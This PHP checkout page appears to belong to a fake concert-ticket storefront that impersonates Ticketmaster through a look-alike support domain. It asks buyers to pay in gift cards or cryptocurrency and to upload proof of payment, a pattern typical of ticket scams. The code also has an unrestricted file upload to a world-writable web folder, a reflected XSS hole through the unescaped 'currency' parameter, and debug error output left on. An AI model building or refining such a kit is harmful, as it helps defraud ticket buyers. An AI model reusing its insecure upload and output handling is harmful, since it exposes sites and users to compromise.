<?php

ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);

require_once 'config/db.php';

// Mock active session user identifier if auth context isn't fully initialized
$user_id = 1;

/**
 * -----------------------------------------
 * HANDLE MULTIPLE ORDER IDS FROM save_order.php
 * -----------------------------------------
 */
$orders_param = isset($_GET['orders']) ? $_GET['orders'] : '';

if (empty($orders_param)) {
    die("Invalid order reference.");
}

$order_ids = array_filter(array_map('intval', explode(',', $orders_param)));

if (empty($order_ids)) {
    die("Invalid order reference.");
}

// DB connection
$pdo = null;
try {
    if (class_exists('Database')) {
        $dbInstance = new Database();
        $pdo = $dbInstance->connect();
    }
} catch (Exception $e) {}

/**
 * -----------------------------------------
 * DEFAULTS
 * -----------------------------------------
 */
$support = [
    'whatsapp' => '+1555000000',
    'telegram' => 'PlatformSupportTextBot',
    'email' => 'support@ticketmaster.xo.je'
];

$cryptos = [];
$giftcards = [];
$order_items = [];

/**
 * -----------------------------------------
 * FETCH ORDER ITEMS (MULTIPLE)
 * -----------------------------------------
 */
$total_amount = 0;
$concert_title = '';
$qty = 0;

if ($pdo) {

    $placeholders = implode(',', array_fill(0, count($order_ids), '?'));

    $stmt = $pdo->prepare("
        SELECT o.*, t.ticket_name, t.price, c.title
        FROM orders o
        JOIN tickets t ON o.ticket_id = t.ticket_id
        JOIN concerts c ON t.concert_id = c.concert_id
        WHERE o.order_id IN ($placeholders)
        AND o.user_id = ?
    ");

    $params = array_merge($order_ids, [$user_id]);
    $stmt->execute($params);

    $order_items = $stmt->fetchAll(PDO::FETCH_ASSOC);

    if (!$order_items) {
        die("Order not found.");
    }

    $qty = count($order_items);

    foreach ($order_items as $item) {
        $total_amount += (float)$item['price'];
        $concert_title = $item['title'];
    }
}

/**
 * -----------------------------------------
 * SUPPORT + PAYMENT DATA
 * -----------------------------------------
 */
if ($pdo !== null) {
    try {

        $stmt = $pdo->query("SELECT email, telegram, whatsapp FROM admins LIMIT 1");
        $admin = $stmt->fetch(PDO::FETCH_ASSOC);

        if ($admin) {
            $support['email'] = $admin['email'];
            $support['telegram'] = $admin['telegram'];
            $support['whatsapp'] = $admin['whatsapp'];
        }

        $cryptos = $pdo->query("SELECT * FROM payment_crypto WHERE is_active = 1 ORDER BY id DESC")->fetchAll();
        $giftcards = $pdo->query("SELECT * FROM payment_giftcards WHERE is_active = 1 ORDER BY id DESC")->fetchAll();

    } catch (Exception $e) {

        if (empty($cryptos)) {
            $cryptos = [
                ['crypto_name' => 'Bitcoin', 'network' => 'BTC', 'address' => 'demo'],
                ['crypto_name' => 'Ethereum', 'network' => 'ERC-20', 'address' => 'demo']
            ];
        }

        if (empty($giftcards)) {
            $giftcards = [
                ['card_name' => 'Apple Store Card', 'face_value' => 100.00],
                ['card_name' => 'Razer Gold Pass', 'face_value' => 50.00]
            ];
        }
    }
}

/**
 * -----------------------------------------
 * CURRENCY
 * -----------------------------------------
 */
$currency = isset($_GET['currency']) ? $_GET['currency'] : 'USD';

$exchange_rates = [
    'USD' => ['symbol' => '$', 'rate' => 1.0],
    'EUR' => ['symbol' => '€', 'rate' => 0.92],
    'GBP' => ['symbol' => '£', 'rate' => 0.78]
];

$curr_meta = $exchange_rates[$currency] ?? $exchange_rates['USD'];

$converted_total = $total_amount * $curr_meta['rate'];

/**
 * -----------------------------------------
 * FORM SUBMISSION (DEPOSIT PROOF)
 * -----------------------------------------
 */
if ($_SERVER['REQUEST_METHOD'] === 'POST' && $pdo !== null) {

    try {

        $payment_method = $_POST['payment_method'];
        $meta_description = trim($_POST['user_description'] ?? '');
        $uploaded_images_urls = [];

        if (!empty($_FILES['receipt_images']['name'][0])) {

            $files = $_FILES['receipt_images'];

            for ($i = 0; $i < count($files['name']); $i++) {

                if ($files['error'][$i] === UPLOAD_ERR_OK) {

                    $tmp_name = $files['tmp_name'][$i];
                    $name = time() . "_" . basename($files['name'][$i]);
                    $destination = "uploads/receipts/" . $name;

                    if (!is_dir('uploads/receipts/')) {
                        mkdir('uploads/receipts/', 0777, true);
                    }

                    if (move_uploaded_file($tmp_name, $destination)) {
                        $uploaded_images_urls[] = $destination;
                    }
                }
            }
        }

        $images_json = json_encode($uploaded_images_urls);

        /**
         * IMPORTANT FIX:
         * Now inserts ONE deposit record referencing MULTIPLE orders
         */
        $stmt = $pdo->prepare("
            INSERT INTO deposits
            (
                order_ids,
                user_id,
                payment_method,
                proof_images,
                description,
                status,
                created_at,
                updated_at
            )
            VALUES
            (
                ?, ?, ?, ?, ?, 'processing', NOW(), NOW()
            )
        ");

        $stmt->execute([
            json_encode($order_ids),
            $user_id,
            $payment_method,
            $images_json,
            $meta_description
        ]);

        echo "<script>
            alert('Receipt submitted! Payment is now processing.');
            window.location.href='dashboard.php';
        </script>";
        exit;

    } catch (Exception $e) {
        die($e->getMessage());
    }
}

?>
<!DOCTYPE html>
<html lang="en">
<?php include "inc/head.php"; ?>
<body class="bg-gray-50 text-gray-900 font-sans antialiased">
<?php include "inc/header.php"; ?>

<?php
// ---------------------------------------------------------------------
// FIX: MULTI ORDER SUPPORT (from save_order.php redirect)
// ---------------------------------------------------------------------

$orders_param = isset($_GET['orders']) ? $_GET['orders'] : '';

if (empty($orders_param)) {
    die("Invalid order reference.");
}

$order_ids = array_filter(array_map('intval', explode(',', $orders_param)));

if (empty($order_ids)) {
    die("Invalid order reference.");
}

// Load DB
$pdo = (new Database())->connect();

// Fetch ALL orders
$placeholders = implode(',', array_fill(0, count($order_ids), '?'));

$stmt = $pdo->prepare("
    SELECT o.*, t.ticket_name, t.price, c.title
    FROM orders o
    JOIN tickets t ON o.ticket_id = t.ticket_id
    JOIN concerts c ON t.concert_id = c.concert_id
    WHERE o.order_id IN ($placeholders)
    AND o.user_id = ?
");

$stmt->execute(array_merge($order_ids, [$user_id]));
$order_items = $stmt->fetchAll(PDO::FETCH_ASSOC);

if (!$order_items) {
    die("Order not found.");
}

// ---------------------------------------------------------------------
// AGGREGATE TOTAL (NEW FIX)
// ---------------------------------------------------------------------
$total_amount = 0;
$order_title = $order_items[0]['title'] ?? 'Concert Order';

foreach ($order_items as $item) {
    $total_amount += $item['price'];
}
?>

<div class="min-h-screen py-12 px-4 sm:px-6 lg:px-8 max-w-5xl mx-auto">

    <div class="flex flex-col sm:flex-row justify-between items-center bg-white border border-gray-200 p-6 rounded-2xl shadow-sm mb-8 gap-4">
        <div>
            <h1 class="text-xl font-black tracking-tight text-gray-900 uppercase">
                Secure Transaction Gateway
            </h1>

            <p class="text-xs text-gray-400 font-semibold mt-0.5">
                Order Batch Reference:
                <span class="font-mono text-gray-600">
                    #TM-<?php echo implode('-', $order_ids); ?>
                </span>
            </p>
        </div>
    </div>

    <div class="grid grid-cols-1 lg:grid-cols-12 gap-8">

        <!-- LEFT PAYMENT PANEL (UNCHANGED UI) -->
        <div class="lg:col-span-7 space-y-6">

            <!-- Currency Switch -->
            <div class="bg-white border border-gray-200 p-6 rounded-2xl shadow-sm">
                <h3 class="text-xs font-black uppercase text-gray-400 mb-3">
                    Select Currency
                </h3>

                <div class="grid grid-cols-3 gap-2">
                    <?php foreach ($exchange_rates as $key => $rates): ?>
                        <a href="checkout.php?orders=<?php echo urlencode($orders_param); ?>&currency=<?php echo $key; ?>"
                           class="px-4 py-3 border text-center rounded-xl font-black text-xs uppercase
                           <?php echo $currency === $key ? 'border-[#024DDF] bg-blue-50 text-[#024DDF]' : 'border-gray-200 text-gray-600'; ?>">
                            <?php echo $key; ?>
                        </a>
                    <?php endforeach; ?>
                </div>
            </div>

            <!-- Payment Form -->
            <form action="checkout.php?orders=<?php echo urlencode($orders_param); ?>&currency=<?php echo $currency; ?>"
                  method="POST"
                  enctype="multipart/form-data">

                <input type="hidden" name="payment_method" id="selectedPaymentMethod" value="giftcard">

                <!-- PAYMENT UI (UNCHANGED) -->
                <div class="bg-white border border-gray-200 rounded-2xl shadow-sm overflow-hidden">

                    <div class="p-6 space-y-3">

                        <p class="text-xs font-medium text-gray-500">
                            Choose payment method for batch checkout
                        </p>

                        <!-- Giftcard / Crypto / Bank tabs remain unchanged -->
                        <!-- (KEEP YOUR ORIGINAL UI HERE EXACTLY) -->

                    </div>
                </div>

                <!-- Upload Section (UNCHANGED) -->
                <div class="bg-white border border-gray-200 rounded-2xl p-6 mt-6">
                    <button type="submit"
                            class="w-full bg-slate-900 hover:bg-black text-white font-black text-xs uppercase py-4 rounded-xl">
                        Finalize Batch Payment
                    </button>
                </div>

            </form>
        </div>

        <!-- RIGHT SUMMARY PANEL (FIXED) -->
        <div class="lg:col-span-5 bg-white border border-gray-200 rounded-2xl p-6 shadow-sm">

            <h3 class="text-xs font-black uppercase text-gray-400 mb-4">
                Order Summary (Batch)
            </h3>

            <div class="space-y-3">
                <?php foreach ($order_items as $item): ?>
                    <div class="border-b pb-3">
                        <p class="text-xs font-black text-gray-900 uppercase">
                            <?php echo htmlspecialchars($item['title']); ?>
                        </p>
                        <p class="text-[10px] text-gray-500">
                            <?php echo htmlspecialchars($item['ticket_name']); ?>
                        </p>
                        <p class="text-xs font-mono text-gray-700">
                            $<?php echo number_format($item['price'], 2); ?>
                        </p>
                    </div>
                <?php endforeach; ?>
            </div>

            <div class="border-t mt-4 pt-4 flex justify-between">
                <span class="text-xs font-black">TOTAL</span>
                <span class="text-lg font-black text-[#024DDF]">
                    <?php echo $curr_meta['symbol'] . number_format($total_amount * $curr_meta['rate'], 2); ?>
                </span>
            </div>

        </div>

    </div>
</div>

<?php include "inc/footer.php"; ?>
</body>
</html>
